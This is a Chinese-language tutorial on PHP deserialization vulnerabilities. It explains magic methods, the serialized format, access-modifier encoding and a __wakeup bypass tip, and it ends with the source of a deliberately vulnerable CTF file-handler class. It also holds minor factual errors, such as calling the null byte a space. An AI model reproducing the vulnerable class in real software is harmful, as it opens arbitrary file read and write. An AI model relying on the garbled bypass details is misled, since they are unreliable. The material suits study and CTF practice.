Web漏洞-反序列化（PHP）

原理

  • 序列化：将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。
  • 反序列化：顾名思义。

技术

  • 有类（触发相关魔术方法）
    • __construct 【对象创建时触发】
    • __destruct 【对象被销毁时触发】
    • __toString 【当对象被当做一个字符串使用时调用】
    • __sleep 【序列化对象之前就调用此方法(其返回需要一个数组)】
    • __wakeup 【反序列化恢复对象之前调用该方法】
    • __call 【当调用对象中不存在（私有）的方法会自动调用该方法】
    • __get 【在调用私有属性的时候会自动执行】
    • __set 【将数据写入不可访问的属性】
    • __isset 【在私有属性上调用isset()或empty()触发】
    • __unset 【在不可访问的属性上使用unset()时触发】
    • __invoke 【当脚本尝试将对象调用为函数时触发】
  • 无类

利用

  • 真实应用 / CTF
  • unserialize() 的变量可控
  • 文件中存在可利用的类
  • 类中有魔术方法

危害

  • SQL注入
  • 代码执行
  • 目录遍历
  • …

PHP

  • serialize() // 将对象序列化成一个字符串
  • unserialize() // 将字符串反序列化成为一个对象
# 无类
# 1.序列化
<?php
    $key='test';
    echo serialize($key);
?>
//输出如下：
	s:4:"test";
	
# 2.反序列化
<?php
    $key='s:4:"test";';
    echo unserialize($key);
?>
// 输出如下：
	test
  • 序列化后大致的含义：O : 4 : “info” : 2 : {s : 4 : “name” ; s : 2 : “19” ;}
    • O 代表Object
    • 4 代表对象长度
    • info 代表对象名称
    • 2 代表对象中变量（属性）的个数
    • s 代表属性名数据类型string，类似的还有其他类型例如i –> int
    • 4 属性名长度
    • name 属性名
    • s 属性值的类型
    • 2 属性值的长度
    • 19 属性值

访问修饰符序列化后的区别

public：属性被序列化的时候属性名不变； protected：属性被序列化的时候属性名会变成%00*%00属性，长度跟随属性名长度而改变 private：属性被序列化的时候属性名会变成%00类名%00属性名，长度跟随属性名长度而改变

<?php
class User{
    public $Username = "admin";  // 序列化后正常
    protected $skill = "ctr";    // 序列化后多%00*%00，占三个字节的长度
    private $Password = "flag";  // 序列化后多%00类名%00，占（两个字节 + 类名的长度）字节

}
$a = new User();
echo serialize($a);

?>

O:4:"User":3:{s:8:"Username";s:5:"admin";s:8:"%00*%00skill";s:3:"ctr";s:14:"%00User%00Password";s:4:"flag";}

注：这里的%00也就是表示空字符（即空格），在url中用%00表示，在hex中表示\x00【%00和\x00也就是我们常说的00截断】

# 像这种整型长度就位零
<?php
    $key=123456;   // $key="123456" 就代表字符串
    echo serialize($key);
?>

# 输出如下：
	i:123456;

# 有类
<?php
class Test{
    public $test = "yyds";
    protected $name = "cxk";
    private $skills = "c/t/r";
    
    function  __construct() {
        echo"调用了构造函数\n";
    }
    
    function __destruct() {
        echo("程序结束，自动调用了析构函数，销毁对象\n");
    }
    
    function __sleep() {
        echo("序列化时会先调用sleep函数（若存在）并且只会序列化sleep中的属性\n");
        return array('name');
    }
    
    function __wakeup() {
        echo("执行反序列化操作时会调用wakeup函数（若存在）\n");
    }
}    
echo("创建对象\n");
$a = new Test;

echo("序列化\n");
$ser_a = serialize($a);
echo($ser_a);
echo PHP_EOL; //换行

echo("反序列化\n");
$unser_a = unserialize($ser_a);
var_dump($unser_a);
?>

输出如下：

创建对象
调用了构造函数
序列化 序列化时会先调用sleep函数（若存在）并且只会序列化sleep中的属性 O:4:“Test”:1:{s:7:"*name";s:3:“cxk”;} 反序列化 执行反序列化操作会调用wakeup函数（若存在） object(Test)#2 (3) { [“test”]=> string(4) “yyds” [“name”:protected]=> string(3) “cxk” [“skills”:“Test”:private]=> string(5) “c/t/r” } 程序结束，自动调用了析构函数，销毁对象 程序结束，自动调用了析构函数，销毁对象 【注】

  • 反序列化会自动多调用一次析构函数
  • 绕过wakeup：修改属性类型或属性名长度均可绕过执行__wakeup，因为你构造的属性和真实的属性不符；但修改属性值是不会绕过__wakeup，所以综述：只有改变**属性个数、属性类型、属性名**才可以绕过！

<?php
 
include("flag.php");
 
highlight_file(__FILE__);
 
class FileHandler {
 
    protected $op;
    protected $filename;
    protected $content;
 
    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }
 
    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
 
    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
 
    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }
 
    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }
 
    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
 
}
 
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
